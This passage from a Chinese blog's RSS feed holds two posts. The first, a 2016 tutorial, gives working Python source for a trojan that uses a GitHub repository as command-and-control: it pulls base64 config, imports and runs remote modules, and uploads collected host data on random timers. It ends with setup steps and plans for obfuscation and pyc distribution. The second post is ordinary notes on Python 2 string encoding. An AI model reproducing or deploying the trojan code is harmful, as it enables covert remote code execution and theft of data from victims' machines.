    &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repository&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;blackhatpythonbook&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;master&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;tree&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recurse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Found file &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;

            &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_json_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;

    &lt;span class="n"&gt;config_json&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_config&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt;        &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;config_json&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

            &lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;remote_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;.data&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remote_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Commit message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# store the result in our repo&lt;/span&gt;
    &lt;span class="n"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;


&lt;span class="c1"&gt;# main trojan loop&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;meta_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

        &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],))&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="_3"&gt;相关模块说明&lt;/h3&gt;
&lt;h5 id="github3py"&gt;&lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Python library for interfacing with the GitHub APIv3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id="imp"&gt;&lt;a href="https://docs.python.org/2/library/imp.html"&gt;imp&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Access the import internals&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="_4"&gt;运行&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#fork https://github.com/wwj718/blackhatpythonbook&lt;/span&gt;
git clone https://github.com/USERNAME/blackhatpythonbook
&lt;span class="nb"&gt;cd&lt;/span&gt; blackhatpythonbook
mv local.yaml.template local.yaml
&lt;span class="c1"&gt;#填入你的github的用户名和密码&lt;/span&gt;
pip install github3.py
python git_trojan.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后你的本机数据将每隔一段时间上传到data/abc目录中，值得注意的是，数据经过base64编码&lt;/p&gt;
&lt;p&gt;你也可以在modules目录下新建功能脚本，脚本将被定期拉到client执行，这样一来你可以以插件的形式来添加task&lt;/p&gt;
&lt;h1 id="_5"&gt;想象空间&lt;/h1&gt;
&lt;p&gt;我们发现一个有趣的现象，那些叫做软件的代码，通常拥有充足的资源和权限，用户尽力满足配合软件的种种需求，饶是如此，它们还常常莫名其妙地奔溃，而另一类被称作病毒的代码，时刻被限制和提防，饶是如此，它们依然能在各种复杂的环境下健壮地运行。&lt;/p&gt;
&lt;p&gt;在某种意义上，计算机科学由黑客（hacker）驱动着&lt;/p&gt;
&lt;p&gt;我们实际上可以将以上代码看做一种热更新机制，我们可以用它来升级已分发的程序，不需要重启就能升级软件，看上去如同生物一般生长&lt;/p&gt;
&lt;h1 id="github-webhooks-services"&gt;github Webhooks &amp;amp; services&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Webhooks allow external services to be notified when certain events happen within your repository. When the specified events happen, we’ll send a POST request to each of the URLs you provide&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用github提供的webhook功能，我们可以进行时间通知&lt;/p&gt;
&lt;h3 id="_6"&gt;热加载&lt;/h3&gt;
&lt;p&gt;热加载是我前段时间感兴趣的一个话题，最初源于和@xudong的讨论，有空再写这部分 &lt;/p&gt;
&lt;h1 id="_7"&gt;建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用小号测试&lt;/li&gt;
&lt;li&gt;不要做坏事哦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_8"&gt;接下来干啥&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;代码混淆&lt;/li&gt;
&lt;li&gt;分发pyc&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_9"&gt;坑&lt;/h1&gt;
&lt;h3 id="pyinstaller"&gt;pyinstaller&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;pyinstaller --onefile git_trojan.py 能能通过&lt;/li&gt;
&lt;li&gt;pyinstaller 编译python2脚本时Queue会找不到， 使用2to3转为python3编译，会进进下一个问题&lt;/li&gt;
&lt;li&gt;github3.py引用的requests会报错，编码问题（python2和3都存在）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_10"&gt;编码问题&lt;/h3&gt;
&lt;p&gt;2to3 -w git_trojan.py,之后用python3执行，报错：&lt;code&gt;LookupError: unknown encoding: idna&lt;/code&gt;&lt;/p&gt;
&lt;h1 id="_11"&gt;资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;blackhatpythonbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Jul 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-07-13:use-python-and-github-create-Trojan-Horse.html</guid><category>dev-tools</category></item><item><title>编码相关的笔记</title><link>/decode-and-encode-note.html</link><description>&lt;p&gt;编码/解码问题是个大坑，其中的复杂性，大多来自历史包袱&lt;/p&gt;
&lt;p&gt;由于计算机领域的分层架构和多平台问题，这个问题被进一步加剧，unicode的出现，给这个问题带来了曙光.&lt;/p&gt;
&lt;p&gt;可是生活不总是那么美好的，有些时候，一不小心，我们还是会掉到满是泥沼的坑里&lt;/p&gt;
&lt;p&gt;周末在凤凰书城看一本数据清洗相关的书，其中说道噪声数据的问题，有问题的编码是噪声的来源之一，书中分享了不少好用的方法，在便签里记了一些，加上之前笔记里的，正好整理成一篇文章&lt;/p&gt;
&lt;h1 id="_1"&gt;编码问题&lt;/h1&gt;
&lt;p&gt;这里引《中文编码杂谈》中关于乱码的讨论&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Linux平台上如果使用cat等命令查看文件中的中文内容时，可能出现乱码。这也是编码的问题。简单的说是文件时按照A编码保存，但是cat命令按照当前Locale设定的B编码去查看，在B和A不兼容的时候就出现了乱码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_2"&gt;核心概念&lt;/h1&gt;
&lt;p&gt;引&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_3"&gt;字符集&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;简单的说字符集就规定了某个文字对应的二进制数字存放方式（编码）和某串二进制数值代表了哪个文字（解码）的&lt;code&gt;转换关系&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="_4"&gt;字符编码&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数  --wikipedia&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="unicodeutf-8"&gt;Unicode和UTF-8&lt;/h1&gt;
&lt;p&gt;Unicode对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。&lt;/p&gt;
&lt;p&gt;Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储&lt;/p&gt;
&lt;p&gt;而UTF-8就是字符编码，是Unicode规则字库的一种实现形式&lt;/p&gt;
&lt;h1 id="python"&gt;Python中的编码问题&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;一文中描述了python中可能出现的一些编解码难题&lt;/p&gt;
&lt;p&gt;原因之一是Python 2.x默认将所有的字符串当做ASCII来对待（python3中会好很多）&lt;/p&gt;
&lt;p&gt;当你使用string类型时，实际上会储存一个字节串&lt;/p&gt;
&lt;h3 id="_5"&gt;解码字节流&lt;/h3&gt;
&lt;p&gt;你可以把字节流&lt;code&gt;解码&lt;/code&gt;(decode)成一个Unicode对象，把一个Unicode 对象编码(encode)为字节流&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你最好是尽早的将字节流解码为Unicode(字节流进入程序的时候)&lt;/li&gt;
&lt;li&gt;你不能简单地输出一个Unicode对象。它必须在输出前被变成一个字节串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="strunicode"&gt;str/unicode&lt;/h3&gt;
&lt;p&gt;在mac下python2.7.5&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# unicode&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\u4f60\u597d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; 
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;

&lt;span class="c1"&gt;# unicode_c = unicode(&amp;quot;你好&amp;quot;) python2会报错，python会把所有东西作为字节流理解&lt;/span&gt;
&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#  True，如果&lt;/span&gt;

&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;################&lt;/span&gt;
&lt;span class="c1"&gt;# str&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="o"&gt;==&lt;/span&gt;  &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;__repr__的目标是准确性，__str__的目标是可读性&lt;/p&gt;
&lt;h3 id="codecs"&gt;codecs模块&lt;/h3&gt;
&lt;p&gt;codecs模块能在处理字节流的时候提供很大帮助。你可以用定义的编码来打开文件并且你从文件里读取的内容会被自动转化为Unicode对象。&lt;/p&gt;
&lt;p&gt;读写文件&lt;/p&gt;
&lt;p&gt;当从一个文件读取数据的时候，codecs.open 会创建一个文件对象能够自动将utf-8编码文件转化为一个Unicode对象,而写入文件这样写：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/utf-8.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\u2013&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用urllib流&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
